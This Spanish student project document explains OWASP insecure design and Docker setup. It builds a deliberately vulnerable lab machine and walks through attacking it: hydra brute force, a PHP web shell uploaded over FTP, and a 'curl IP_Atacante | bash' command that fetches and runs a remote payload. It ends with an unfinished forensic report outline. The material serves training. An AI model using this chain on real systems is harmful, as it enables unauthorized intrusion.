# **Documentación Final**

### Las vulnerabilidades que tenemos son las siguientes: 
  ## A04:2021 - Diseño Inseguro
  
  ### Ejemplos de esta vulnerabilidad:
  
  1. Falta de Principio de Menor Privilegio:

      **Descripción:** Concede a los usuarios más privilegios de los necesarios para realizar sus tareas.
   
      **Problema de Seguridad:** Si un usuario tiene más permisos de los necesarios, podría abusar de ellos o ser blanco de ataques que aprovechen esos privilegios.

  3. Autenticación y Autorización Inadecuadas:

      **Descripción:** Implementación débil de procesos de autenticación y autorización.
   
      **Problema de Seguridad:** Puede permitir el acceso no autorizado o eludir controles de acceso, permitiendo a usuarios malintencionados realizar acciones sin ser detectados.

  5. Falta de Validación de Datos:

      **Descripción:** No se valida o filtra adecuadamente la entrada del usuario.
   
      **Problema de Seguridad:** Exposición a ataques como inyección de código, donde un atacante podría insertar datos maliciosos para manipular el comportamiento de la aplicación.

  7. Deficiencias en la Gestión de Sesiones:

      **Descripción:** Sesiones de usuario mal gestionadas, como almacenar información sensible en cookies sin cifrar.
   
      **Problema de Seguridad:** Puede resultar en la interceptación de sesiones, permitiendo a un atacante acceder a la cuenta de otro usuario.

  9. Falta de Encriptación:

      **Descripción:** Comunicaciones no seguras entre el navegador y el servidor.
   
      **Problema de Seguridad:** La información transmitida podría ser interceptada, comprometiendo la confidencialidad e integridad de los datos.

  10. Desactualización de Dependencias:

      **Descripción:** Uso de bibliotecas o frameworks desactualizados y vulnerables.
    
      **Problema de Seguridad:** Puede permitir a los atacantes aprovechar vulnerabilidades conocidas en las dependencias para comprometer la aplicación.

  ## A08:2021 - Fallas en el Software y en la Integridad de los Datos
 
  ### Ejemplos de esta vulnerabilidad:

  1. Fallas en el Software:

      **Inyección de Código (SQL Injection, XSS, etc.):** Estas vulnerabilidades ocurren cuando un atacante puede insertar código malicioso en los datos que se procesan en el lado del servidor o se muestran en el lado del           cliente. Por ejemplo, en una inyección de SQL, un atacante podría manipular las consultas a la base de datos para obtener información no autorizada.

      **Fallas en la Autenticación y Autorización:** Si el software no maneja adecuadamente la autenticación (verificación de la identidad del usuario) y la autorización (control de los permisos de acceso), un atacante           podría ganar acceso no autorizado a áreas protegidas de una aplicación web.

      **Desbordamiento de Búfer:** Estos errores ocurren cuando un programa permite que se escriba más información en un área de memoria de la que puede contener, lo que puede ser explotado por un atacante para ejecutar         código malicioso.

  2. Integridad de los Datos:

      **Manipulación de Datos:** Un atacante podría modificar los datos almacenados en una aplicación web para cambiar información crítica, como alterar el contenido de perfiles de usuario, el monto de transacciones o             cualquier otra información sensible.

      **Falta de Validación de Entradas:** Si una aplicación web no valida adecuadamente las entradas del usuario, un atacante podría enviar datos maliciosos que afecten la integridad de la aplicación. Por ejemplo,                 podrían enviar formularios con datos manipulados para realizar acciones no autorizadas.

      **Falta de Encriptación:** La falta de encriptación en la transmisión de datos puede permitir a un atacante interceptar y modificar la información transmitida entre el usuario y el servidor, comprometiendo así la           integridad de los datos.

  ## Diferencias entre estas vulnerabilidades:
  
  * El **diseño inseguro** se refiere a problemas fundamentales en la concepción y planificación de un sistema, aplicación o red desde el principio.
  
  * Las **fallas en el sofware y en la integridad de los datos** se centran en problemas específicos relacionados con la implementación de software y el manejo de datos, ya sea durante el desarrollo
    o en el funcionamiento del sistema.

## Que és Docker Hub?

  **DockerHub** es un servicio público en la nube proporcionado por **Docker** y similar a Github, que permite a los desarrolladores almacenar, distribuir y gestionar contenedores Docker. 
  En **DockerHub** también podemos crear nuestros propios repositorios privados.
  En resumen, **DockerHub** es una plataforma esencial para la gestión de contenedores **Docker**, facilitando el proceso de desarrollo, distribución y despliegue de aplicaciones en contenedores.

## Que es Docker?

  **Docker** es una plataforma de código abierto que permite empaquetar, distribuir y ejecutar aplicaciones en entornos aislados llamados contenedores.
  Un **contenedor** es una unidad de software ligera y portátil que incluye todo lo necesario para ejecutar una aplicación, incluyendo el código, las bibliotecas y las dependencias.

## Como funciona Docker?

  * Imágenes de Docker:

      **Definición**: Una imagen de Docker es un paquete ligero y autónomo que contiene todo lo necesario para ejecutar una aplicación: código, bibliotecas, herramientas y configuraciones.

      **Uso**: Las imágenes de Docker se utilizan como base para crear contenedores.

  * Contenedores de Docker:
  
      **Definición**: Un contenedor de Docker es una instancia en ejecución de una imagen de Docker. Es un entorno aislado y seguro que ejecuta una aplicación de manera consistente en cualquier entorno.

      **Uso**: Los contenedores se crean a partir de imágenes de Docker utilizando el comando docker run. Estos contenedores se pueden iniciar, detener, reiniciar, y eliminar según sea necesario.
  
  * Dockerfile:
  
      **Definición**: Un Dockerfile es un archivo de texto plano que contiene una serie de instrucciones para construir una imagen de Docker. Las instrucciones incluyen acciones como la instalación de paquetes, la               configuración de variables de entorno y la copia de archivos en la imagen.

## Como utilizar DockerHub y Docker?
  
  1. Para empezar nos tenemos que crear una cuenta en [DockerHub](https://hub.docker.com/).
  2. Una vez tenemos la cuenta creada en DockerHub debemos instalar Docker en nuestra maquina, nosotros lo hemos hecho en Kali Linux siguiendo estos [pasos](https://www.kali.org/docs/containers/installing-docker-on-kali/).
  3. Con Docker instalado, deberemos iniciar sesión ejecutando el siguiente comando e introduciendo nuestras credenciales de la cuenta de DockerHub.
     
     > docker login
  4. En DockerHub deberemos crear 2 repositorios, 1 para cada maquina que montemos.
  5. Para antes de subir la imagen de Docker al correspondiente repositorio, deberemos crear un DockerFile dependiendo de nuestras necesidades.
  6. Para generar la imagen a través del DockerFile ejecutaremos el siguiente comando:

     > docker build -t usuarioDockerHub/nombreImagen:tag . 
  8. Para iniciar la imagen creada deberemos ejecutar el siguiente comando:
    
     > docker run usuarioDockerHub/nombreImagen:tag
  10. Verificaremos que nuestro docker se encuentra ejecutandose con el comando:

      > docker ps
  12. Para acceder dentro del contenedor ejecutaremos el siguiente comando:

      > docker exec -it IMAGE_ID bash
  14. Una vez hayamos hecho los cambios necesarios dentro del contenedor, para aplicar estos cambios debremos ejecutar el siguiente comando para guardar la imagen en una nueva versión:

      > docker commit IMAGE_ID usuarioDockerHub/nombreImagen:tagNuevaVersion
  15. Para verificar que se nos ha creado una nueva versión de la imagen ejecutaremos el siguiente comando:

      > docker images
  16. En caso de que queramos eliminar la imagen antigua para no confundirnos deberemos ejecutar el siguiente comando:

      > docker rmi usuarioDockerHub/nombreImagen:tagAntiguaVersion
  18. Para subir la imagen de Docker que hemos creado a su respectivo repositorio de DockerHub, deberemos tener iniciada la sesión desde nuestra maquina, este paso lo hemos realizado en el numero 3.
  19. Para subir la imagen se debe tener en cuenta que debe cumplir con la nomenclatura especificada en el repositorio de DockerHub, es decir usuarioDockerHub/nombreRepositorio, en nuestro caso seria marcositb/grupo4_insecure_design. Subiremos la imagen con el siguiente comando:

      > docker push usuarioDockerHub/nombreRepositorio:tagVersion
  20. Si desconocieramos la IP de nuestro Docker que hemos ejecutado, deberemos ejecutar el siguiente comando:

      > docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nombreContenedor|ImageID



# Maquina Diseño Inseguro

## Creación de la maquina:

- Instalación de docker a nuestro sistema Ubuntu.
- Creación de cuenta de DockerHub para guardar las imagenes en la nube y poder compartiras con el grupo.
- Creación acrivo dockerfile:

FROM marcositb/grupo4_insecure_design:v1.0

// Exponer los puertos necesarios

EXPOSE 80 20 21 22

// Comando para iniciar los servicios

CMD service apache2 start && service vsftpd start && /usr/sbin/sshd -D


- Abrimos un terminal y nos ponemos como sudo(sudo su).
- En la misma ruta donde esta el archivo dockerfile ejecutamos el siguiente comando: docker build -t marcositb/grupo4_insecure_design:v1.0 . para crear la imagen.
- Una vez creada la iniciamos haciendo un docker run marcositb/grupo4_insecure_design:v1.0
- Entramos dentro de la maquina haciendo un docker exec -it idContenedor bash.
- Hemos tenido que instalar por nuestra cuenta diferentes herramientas como: vim, python3.10, nano, etc.

## FTP

Lo primero que hemos hecho es mirar si el servicio de ftp esta encendido con service vsftpd status, si esta encendido bien si no hacemos service vsftpd start.

Una vez iniciado creamos un usuario local con adduser elijah, porque queremos tener uno solo para ftp aparte del anonymous.

Para configurar los permisos del anonymous y los del usuario elijah tenemos que modificar los siguientes ficheros (vsftpd.conf, passwd):

- vsftpd.conf lo abrimos con vim /etc/vsftpd.conf y cambiemos lo siguiente

![vsftpd](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/87d2c177-1526-4dda-b3ba-549a1d9d8c65)

- Y passwd le ponemos al usuario elijah /sbin/nologin para que solo se pueda hacer login desde ftp.
![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/1b775ca7-0ca6-4f51-a9c3-7b11c87749dd)

## Web (apache2)

Lo único que hemos implementado aqui es un fichero html para que se visualice al poner la ip en el navegador.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/3cd6dd51-1085-4ecd-b9b3-2e8a28da10de)


## Que vulnerabilidades hemos hecho y como las hemos implementado:

Para empezar tenemos una web inspirada en la serie The Originals. Hemos implementado los servicios apache, ftp y ssh.

En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get.

En la web podemos obserbar una galeria con diferentes personajes, donde el atacante puede hacer una lista y probar de hacer un hydra con cada unos de estos personajes, hasta acertar con el usuario.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/0ce0aa3a-6ba9-45a4-988c-ba699a50ad58)

El atacante intentara acceder con cada uno de los usuario hasta que de con el indicado en este caso elijah, o hacer una enumeración de usuarios por ssh ya que esta es la version que esta instalada.  

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/e99ecaaa-28a2-425a-a8ce-60d34729f041)

Y al hacer la enumeración vemos que usuarios existen.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/43c5976e-819d-40b8-82e1-5a6f956ca96c)

Haciendole un hydra al ftp.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/edbee44e-e7c7-4c34-be78-c65ced4b303e)

Este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.

Tendra que subir un archivo php para ejecutar comandos desde la web. 

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/895f89b4-6099-4433-8876-5c1d98dd4e64)


La maquina atacante tendra lo siguiente:

- Un archivo html con codigo bash dento, y en la misma ruta del archivo abrir un terminal con lo siguiente, para iniciar un servidor web en la maquina atacante.

  ![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/04bff278-aade-47fc-9fab-a15f5a87b7eb)

- Un terminal abierto para ponernos en escucha en http.
  
  ![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/bcb607a2-b054-43bb-8726-999ae8719b34)


Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash, se quedara la pagina pensando.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/98c2016d-2b16-4637-b2de-9cb3e59ed2c1)

Y en el terminal atacante podemos observar que nos hemos registrado como www-data.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/10a24d5e-d24d-470c-bf91-abfa8bbd7af7)

Dentro de este usuario encontramos que no podemos acceder a ningun archivo con privilegios, pero obserbamos que hay un usuario llamado Caroline.
Y en el directorio /etc encontramos una imaghen de carolina la cual si la descargamos a la maquina local y le hacemos un binwalk vemos que tiene un zip dentro.

Para descargar la imagen a la maquina local ponemos como ww-data abrir un servidor web en el puerto 8080

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/ce5514a1-0d3d-46bf-829e-44f6d5f097b2)

En la maquina atacante hacemos un wget http://IP:puerto/caroline.jpg

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/c0e7a6ba-9e95-4290-8f70-9bb01d0fddbc)

Al descargarla se hace un binwalk imagen y vemos que dentro tiene una imagen

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/f7c96f07-1548-4f95-a17f-7c4541b04aed)

Para extraer este zip ponemos binwalk -e carolina.jpg, y nos crea una carpeta con el zip.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/cbafc43e-0b8f-4cfa-a3e2-2ddaeae11bf6)


Al intentar extraerlo nos damos cuenta que tiene contraseña.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/63bec0e4-7179-4ddc-913d-92cfd4727ef8)


Por eso el atacante tendra que usar zip2jhon para sacar el hash de este zip.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/4bc0cfa5-8cd2-4729-9c48-a7c9f34f3b82)

Y con el hash le hacemos un john con la worlist de roockyou para encontrar la contraseña.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/7606ff5b-c493-4caf-8bff-d4ebdcd7ae33)

Una vez extraido el zip, tenemos un archivo txt llamado pwd.txt con muchos nombre, que podrian ser contraseñas.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/2313c247-08eb-4d2b-b04e-e85a793a84ee)

El atacante hara un Hydra al usuario caroline con la lista de contraseñas extraida del zip.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/f602d607-3988-4dec-aa4d-9c24ae449441)

Al encontrar la contraseña podemos entrar desde ssh con este usuario.

![image](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/ad01370f-5a11-4e81-a82e-ccd673c18917)

Analista: Andrades González Paulino  
Empresa cliente: The Originals  
Fecha de inicio: 07/03/24, 15:50  
Fecha de finalización 07/03/24, xx:xx  
## Forense
1. **INTRODUCCION**

1.1 **Informacion recibida**  
La empresa The Originals solicita analizar un equipo que ha sido atacado. Se solicita al analista en cuestión determinar si ha sido comprometido. La empresa sospecha que el atacante pudo haber escalado permisos debido a una mala administración de los servicios y configuración del equipo.

**1.2 Conceptos y terminología**  
Contamos con un equipo de respuesta a incidentes que nos permite identificar, recuperar, reconstruir y analizar evidencias de lo ocurrido. Este equipo forense nos ayuda a llevar a cabo investigaciones, ya sean de naturaleza criminal o no.  

En la actualidad, un incidente de seguridad informática puede considerarse como una violación o intento de violación de la política de seguridad. 

Existen diferentes tipos de incidentes. En este caso, nos enfrentamos a un Ataque de Escalada de Privilegios Externa, lo que indica que el objetivo del atacante es obtener un nivel más alto de acceso del que originalmente poseía, con el fin de controlar, manipular o comprometer el sistema.  

1.3 **Prevención de ataques a sistemas**  
Para la prevención de ataque tenemos que tener en cuenta: 

- Tener una correcta gestión de actualizaciones de hardware y software, ya que muchos de los ataques influyen en estas vulnerabilidades.  
- Hacer una buena gestión de configuración tanto como hardware y software, ya que también muchos ataques influyen que está mal configurado un servicio.  
- Revisar que los servidores tengan un tipo de privilegio mínimo, esto es para que tengan un nivel de registros mínimos y tener más controlado el tráfico de personas que pasan por el servidor.  

En este caso se tendría que haber tenido en cuenta la posible incidencia de que una persona vea la falta de seguridad en el diseño del servidor y intente acceder a datos privados o intentar atacar a la empresa con el propósito de acabar con ella o para ganar algo, en casi todos los casos dinero. Se tendría que haber mejorado los diferentes servicios, actualizarlos y protegerlos para que a esta persona le sea mucho más difícil poder acceder o atacar a la empresa, porque si es el caso de que puede , esta puede ir subiendo de privilegios y acabar en el usuario principal para tener acceso a toda la empresa.

1.4 Aspectos legales

Si con el primer análisis se sospecha de que el incidente ha sido desde el exterior de la propia red de la empresa. Se tendrá que utilizar tiempo para investigar bien por donde y que se ha utilizado para provocar este incidente, hasta llegar al causante de esto, asegurándose antes de que esta persona es la culpable.

En este caso se ha realizado una escalada de privilegios externa , un delito de acceso no autorizado a sistemas informáticos, hacking o intrusión informática, dependiendo de la jurisdicción y las leyes locales específicas, programas o documentos en redes o sistemas informáticos.

2. Fases de Análisis Digital

2.1 Identificación del incidente: búsqueda y recopilación de evidencias.

En el caso de una sospecha de que su equipo ha sido manipulado o comprometido lo primero de todo es no perder la calma , estos incidentes pasan a menudo.
Antes de nada asegúrese que no es un problema de hardware(problemas en sus componentes) o software(aplicaciones, servicios), o problemas de red. 

La resolución de un posible equipo de uso ilegítimo por parte de un atacante, que aprovechó algunas vulnerabilidades en varios servicios incorporados en dicho equipo. Estos servicios no estaban bien configurados, lo que le dio al atacante la oportunidad de acceder de forma comprometedora al equipo. 

2.1.1 Recopilación de evidencias.

- /var/log/apache2/access.log
- /var/log/apache2/error.log 
- /var/log/vsftpd.log

2.1.2 Análisis de la evidencia

2.2 Metodología NIST

La metodología del NIST se basa en un proceso de tres pasos: evaluación del riesgo; mitigación del riesgo; y análisis y evaluación

3. Herramientas para Análisis Forense Digital

4. Conclusión
5. Biografía y URL
